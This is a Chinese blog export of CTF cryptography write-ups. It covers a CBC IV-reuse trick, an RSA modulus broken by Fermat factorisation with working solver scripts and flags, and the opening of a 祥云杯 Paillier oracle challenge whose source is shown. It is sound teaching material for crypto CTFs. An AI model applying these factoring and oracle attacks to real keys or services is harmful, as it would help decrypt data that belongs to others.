<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">clock_t</span> start, finish;</span><br><span class="line">    <span class="keyword">double</span> duration;</span><br><span class="line">    start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> _p = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* _n = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">mpz_t</span> a, p, n, ans;</span><br><span class="line">    mpz_init_set_ui(a, <span class="number">2</span>);</span><br><span class="line">    mpz_inits(p, n, ans, <span class="literal">NULL</span>);</span><br><span class="line">    mpz_set_str(n, _n, <span class="number">10</span>);</span><br><span class="line">    mpz_pow_ui(p, a, _p);</span><br><span class="line">    mpz_powm(ans, a, p, n);</span><br><span class="line">    gmp_printf(<span class="string">&quot;%Zd\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    finish = clock();</span><br><span class="line">    duration = (<span class="keyword">double</span>)(finish - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f seconds\n&quot;</span>, duration);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211115151942289.png" alt="image-20211115151942289"></p>
<p>分治算法有兴趣可以看一下，这里主要考工具使用</p>
<h2 id="baby-cbc"><a href="#baby-cbc" class="headerlink" title="baby_cbc"></a>baby_cbc</h2><p>V神在某次DAS出的Yusa密码学签到，操作比较简单，摸瞎也能出：先把IV丢进去，得到<code>Enc(b&#39;\x00&#39;*16)</code>，再把<code>Enc(b&#39;\x00&#39;*16)</code>丢进去，由于cbc分组模式，IV是会继承的，就是等于上一次加密得到的密文，所以第二次就是<code>Enc(Enc(b&#39;\x00&#39;*16) ^ Enc(b&#39;\x00&#39;*16)) = Enc(b&#39;\x00&#39;*16)</code></p>
<p>AES的CBC模式加密如下图所示</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/AES_CBC.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">plain_blocks = []</span><br><span class="line">cipher_blocks = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">a</span>):</span></span><br><span class="line">    size = (<span class="number">16</span> - <span class="built_in">len</span>(a) % <span class="number">16</span>) % <span class="number">16</span></span><br><span class="line">    a += <span class="built_in">bytes</span>(size) * size</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">enc = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(iv.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _plain_block_i = <span class="built_in">input</span>()</span><br><span class="line">        plain_blocks.append(_plain_block_i)</span><br><span class="line">        plain_block_i = pad(<span class="built_in">bytes</span>.fromhex(_plain_block_i))</span><br><span class="line">        cipher_block_i = enc.encrypt(plain_block_i)</span><br><span class="line">        cipher_blocks.append(cipher_block_i.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="built_in">print</span>(cipher_block_i.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_blocks) - <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> plain_blocks[i] == cipher_blocks[i + <span class="number">1</span>] <span class="keyword">and</span> cipher_blocks[i] != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(f.read())</span><br><span class="line">            exit()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ssssssory&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里稍微改一下，表面上需要使得前一块和后一块密文相等，但和其实原题做法完全一样，就是简单地复制粘贴</p>
<p>只要3次手撸吧（唔，我改成50次了？whatever</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211116101054274.png" alt="image-20211116101054274"></p>
<p><em>好像挺鸡肋的，d⑧q师傅我错了</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;a5fae854-bff1-40c6-86ed-5b7b1b84d147&#125;</span><br></pre></td></tr></table></figure>

<h2 id="baby-RSA"><a href="#baby-RSA" class="headerlink" title="baby_RSA"></a>baby_RSA</h2><blockquote>
<p>hint：经典分解</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line">Q = next_prime(P + getPrime(<span class="number">269</span>))</span><br><span class="line">N = P * Q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (P - <span class="number">1</span>) * (Q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="keyword">assert</span> m == <span class="built_in">pow</span>(c, d, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;N&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># c = 43523864567514744915966689535281796032938848285272379114823034307386872487132537558002098315139078417494456662422159972154875552286129585227356449706489220730274914478951912475004304175148219692251592494173776801031153513926834828210101453328096936742697439995490235629532386225637438572176601752800221641207</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = 74800532075026000381837181416244620595735832084449587543298943677432459925226779465012047327503889744860523742208172886216379540864590422182548917267328318002568353149060053351303844576292098647505525745870477873483633887953229529381991915277382594791671160580866806786630969504851192001076830016106043571009</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一个RSA考经典费马分解吧</p>
<p>原理请看</p>
<p><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/</a></p>
<p>当然知道原理后直接用yafu工具也可（但是我这里参数设置好像只能用脚本实现下费马定理才能出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">74800532075026000381837181416244620595735832084449587543298943677432459925226779465012047327503889744860523742208172886216379540864590422182548917267328318002568353149060053351303844576292098647505525745870477873483633887953229529381991915277382594791671160580866806786630969504851192001076830016106043571009</span></span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([p * q - N, p - q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">abs</span>(ans[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">abs</span>(ans[<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(p, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分解N之后就基本上解决了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P, Q = <span class="number">8648730084528363889079256703102451885638502646326789467433028151231988147282102518446568939251174824284022886978974447762450602661673263195651063256419309</span>, <span class="number">8648730084528363889079256703102451885638502646326789467433028151231988147950513953027745544103648427529036056091995954088466858748986415929861782517451301</span></span><br><span class="line">c = <span class="number">43523864567514744915966689535281796032938848285272379114823034307386872487132537558002098315139078417494456662422159972154875552286129585227356449706489220730274914478951912475004304175148219692251592494173776801031153513926834828210101453328096936742697439995490235629532386225637438572176601752800221641207</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">74800532075026000381837181416244620595735832084449587543298943677432459925226779465012047327503889744860523742208172886216379540864590422182548917267328318002568353149060053351303844576292098647505525745870477873483633887953229529381991915277382594791671160580866806786630969504851192001076830016106043571009</span></span><br><span class="line"></span><br><span class="line">phi = (P - <span class="number">1</span>) * (Q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d1b53047-2985-44ac-8587-9728a9b7d751&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>树哥让我天天写之我就不</category>
      </categories>
  </entry>
  <entry>
    <title>20210821 祥云杯Crypto方向部分WP</title>
    <url>/posts/60aa74b/</url>
    <content><![CDATA[<p>比赛中自己就出了一道，尚师傅出了myRSA，得到他的真传后对这道题思路比较清楚了，还是想复现下，然后Guess这题看了大多师傅的wp都是非预期解，所以想再研究一下，主要想尽量内化成自己的东西</p>
<p>可惜国内的比赛结束就关nc，没有观赏性</p>
<span id="more"></span>

<h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><h2 id="Crypto-Guess（recuring）"><a href="#Crypto-Guess（recuring）" class="headerlink" title="Crypto-Guess（recuring）"></a>Crypto-Guess（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> (</span><br><span class="line">    bytes_to_long,</span><br><span class="line">    getPrime,</span><br><span class="line">    long_to_bytes,</span><br><span class="line">    getRandomNBitInteger,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">WELCOME = <span class="string">&quot;welcome to my funny challenge !!! Can you guess right 32 times in a row? &quot;</span></span><br><span class="line">String = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = exgcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    x, y, q = exgcd(a,p)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;No solution.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (x + p) % p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcm</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a*b // gcd(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span class="string">&quot;&quot;</span>.join([String[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(String) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>], STR[<span class="number">4</span>:], HASH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="comment"># part 1</span></span><br><span class="line">    p, q = getPrime(KEYSIZE), getPrime(KEYSIZE)</span><br><span class="line">    n = p * q</span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    LAMBDA = lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># part 2</span></span><br><span class="line">    _key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _key.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">80</span></span><br><span class="line">    <span class="keyword">assert</span> key[<span class="number">0</span>] == <span class="number">119</span> <span class="keyword">and</span> key[<span class="number">1</span>] ==  <span class="number">241</span> <span class="keyword">and</span> key[<span class="number">2</span>] ==  <span class="number">718</span> <span class="keyword">and</span> key[<span class="number">3</span>] == <span class="number">647</span></span><br><span class="line">    <span class="keyword">return</span> n, g, LAMBDA, key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">n, g, m</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(r, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c = (<span class="built_in">pow</span>(g, m, n ** <span class="number">2</span>) * <span class="built_in">pow</span>(r, n, n ** <span class="number">2</span>)) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">n, g, LAMBDA, c</span>):</span></span><br><span class="line">    L1 = (<span class="built_in">pow</span>(c, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    L2 = (<span class="built_in">pow</span>(g, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    m = (invert(L2, n) * L1) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg, <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Service start.&quot;</span>)</span><br><span class="line">        START, END, HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&quot;SHA-256(?+&#123;&#125;) == &#123;&#125;&quot;</span>.<span class="built_in">format</span>(END, HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        <span class="comment"># step 1. KeyGen</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            self._send(<span class="string">&quot;round &quot;</span> + <span class="built_in">str</span>(_+<span class="number">1</span>))</span><br><span class="line">            n, g, LAM, KEY = keygen()</span><br><span class="line">            self._send(<span class="string">&quot;Step 1 - KeyGen. This is my public key.&quot;</span>)</span><br><span class="line">            self._send(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            self._send(<span class="string">&quot;g = &quot;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">            <span class="comment"># step 2. Phase 1</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 2 - Phase 1. Now, you can give me one ciphertexts,I will return the corresponding plaintext.&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext.&quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step 3. challenge</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 3 - Challenge. Now, you must give me two decimal plaintexts(m0,m1), I will encry them and return a ciphertext randomly&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Give me m0.&quot;</span>)</span><br><span class="line">            plaintext1 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            self._send(<span class="string">&quot;Give me m1.&quot;</span>)</span><br><span class="line">            plaintext2 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                plaintext1 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> plaintext2 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext1)) != <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext2))</span><br><span class="line">            ):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            R = <span class="number">2</span> * random.randint(<span class="number">0</span>, <span class="number">39</span>)</span><br><span class="line">            I = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R])</span><br><span class="line">            cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + <span class="number">1</span>])</span><br><span class="line">            self._send(<span class="string">&quot;This is a ciphertext.&quot;</span>)</span><br><span class="line">            self._send(<span class="built_in">str</span>([cipher1, cipher2][I]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step 4. Phase 2</span></span><br><span class="line"></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 4 - Phase 2. Now, you can give me some ciphertexts,I will return the corresponding plaintext.But you can not give me the ciphertext that I give you in step 3.&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext &quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R] <span class="keyword">or</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step.5 Guess</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 5 - Guess. You must tell me which ciphertext was I give you in step 3, 0 or 1(m0 -&gt; c0 , m1 -&gt; c1)?&quot;</span></span><br><span class="line">            )</span><br><span class="line">            Guess = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> Guess == I:</span><br><span class="line">                self._send(<span class="string">&quot;Good! You are right&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._send(<span class="string">&quot;Sorry!&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        self._send(flag)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>key.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    A = []</span><br><span class="line">    key = random_matrix(ZZ, <span class="number">20</span>, <span class="number">4</span>, x = <span class="number">100</span>, y =<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> key[i,j] <span class="keyword">not</span> <span class="keyword">in</span> A:   </span><br><span class="line">                A.append(key[i,j])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(A) == <span class="number">80</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">hint = Matrix(key * vector([getRandomNBitInteger(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(key))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;hint&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(hint))</span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">269865700520122549144762599745168447135899292447636617756605602545212728167797447445787398106779613741477733230173614340453529478006749280203791219240495545320784253247776438152444000193996715061172344898960798274898870276035746116096626771403981985377907323596813517124099024451197742946526103390328807831246256</span> <span class="number">351825797459362105605308649037214670594688383340169438930434420259269928275998050547973935801446674821508093953928259345972518243250576886209287947085399150853100589302713875591726622523078239591200598436879752732176246887916248939358959982281252327937943016323841545720179709080112518678442049362350981509034718</span> <span class="number">263649494857153084116592322640026892708704523757635879704627428861744239824087544706911427923497181418081141799670872495368713195091290104184732226016053955456080069924363050718931449355663612295983210728462521014504883613920516962136372253488247300322354664463901602570541318156197056622985692829393446426824638</span> <span class="number">453400473599186415430546643705275038528777172686002821040599810743439930425207458033941717472852507386860793929840595207225134962986513734506356764693655438618941180687198445634254053696966577360482969943538482461972582638716434085445938134971492342779462032414137699485112547903822163588315191244265946324218228</span> <span class="number">221827206659930588955100802225668305862545149941640820857015107405314701820405616518433413575662470655465592803570411353938784340140188287733921352831214120360424367473260917811334848500233701311695438235451684226463170984345521338680563403806364662014170986174411732503648583380588103055128943038500134530643916</span> <span class="number">262203710827134666754393441371926810666786719624203864995763104952378827035382567436334257544099220873788181813028566666315029478997429146874858602787070177245600709015255267085423481719645325028750498589844959751577586557620102816409584289798347398835894955523264261758402589145048117452982723970755642721185948</span> <span class="number">449549947180605498384084224904383747663117854129634140960197279513891658001908553899154409208608867208695858453347485738326065752599578853421177093646899183717259826566392731977061092066943083219101516409628761436417329565252863717622046112713719560452994438641997826306366514591051557604666293190256180831457338</span> <span class="number">427882301208025139610114439882502441914598510240693844044902667415035988021658089285061603431657599603331045335448467272333422417626837392018638001129889364932929941669822436427404546395551452209585894226820734770968204014611476942151983657836762789688274393777314450201198374683092768582274185754609711412304708</span> <span class="number">206110709892941001547312247977630809641839341262123534620411119329846379553052343003462513763026898611550676850103678046155244343919504874675861711356256906122323272209951451243624891037181757295933079679771758786258823164385868611152404813858000740881052355543339622168479080269444970004478675521293416826708518</span> <span class="number">376172049695479754397279304655900327678015926783104795566699104261135819399512659621342636669298191140461316867639169744791504345311783942430174703887150776382877123936598986072421903671214609751973940119880560010023509512099294872489902196710299820192154670761462699775769831592820505043876853866377139051584700</span> <span class="number">354989144495191036439184720296945551786270296981167948019894874956969763278354891643393993638515549874937620037229446883785428867336828993393766325205264827014803398207234817979275257572341689686447010646631351076260136309756747006523828716693825921688154934832911308097472833298941167446737019496978821483004142</span> <span class="number">247657418221571455680808477138957290356931207729656804527032245580960429841816418251851497488948400261671314674513219816337747752077679968835580384381624054897709324089163678294189901105831869992119099572932762170016838924353956530516871378196167792087986296536436978303095420850688527841398649861755287315252914</span> <span class="number">267323214115576739778291260842843721623810532694699738318490243647729313782577235628052607303271826513284836885625483822163201361517891012567791817503099871180988597553316105403148790626072424557099203065132199859082058328832860860922184801132168393385984454558438841623269013769064186695669122926428112192958058</span> <span class="number">380213264649117070874301733758703992957052936843733186492527715942930662173593880870634301175054838023249481317633718679161000064110300930539209764959721575720322049712443403460593162873330727228662863503060615472077497723046998024646756953852274720572607225890476747502455930116669002121964715413052946067842934</span> <span class="number">299711354673898453867309253202762657296007144693008209662952150647212243688991887703988087318065032988637761345182760379040409182402949915825642302147237357969028446441002244872828954397547768452078685431997252342287035745022966033862847782615826742413561561692110959439029229515697207807688051683325604252733440</span> <span 